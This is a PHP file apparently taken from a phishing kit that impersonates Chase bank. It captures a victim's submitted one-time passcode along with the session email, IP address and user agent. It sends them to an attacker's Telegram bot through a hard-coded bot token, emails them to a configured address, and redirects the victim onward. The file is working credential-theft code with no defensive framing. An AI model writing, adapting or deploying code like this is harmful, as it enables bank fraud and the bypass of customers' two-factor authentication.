<?php

// Get user's IP address
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// Start session
session_start();

// Check if 'logId' session variable is set


if (isset($_POST['code'])) {
    // Include necessary files
    include 'to.php';

    // Get OTP from the form
    $otp = $_POST['code'];

    // Compose HTML message with emoji
    $message =  "<b>🔒 Chase OTP Tow Verification 🔒</b>\n";
    $message .= "<b>User:</b> <code>{$_SESSION['email']}</code>\n";
    $message .= "<b>OTP:</b> <code>$otp</code>\n";
    $message .= "<b>🌐 IP Address:</b>$ip\n";
    $message .= "<b>⌚ Time:</b> " . date("Y-m-d H:i:s") . "\n";
    $message .= "<b>🖥 User-Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "<b>🔍 Chase Result:</b> \n";

    // Set email subject and headers
    $subject = "Chase LOGIN";
    $headers = "From: BESHO@CHASE" . rand(1, 99) . "BESHO.V1 \r\n";

    // Set Telegram chat ID
    // $chatid = 'your_telegram_chat_id';

    // Send message to Telegram with HTML format
    file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id=" . $chatid . "&parse_mode=HTML&text=" . urlencode($message));

    // Send email

    // Send email
    $done = mail($toemail, $subject, $message, $headers);

    // Redirect to the specified page
    header('Location: ./red33.php');
}

?>
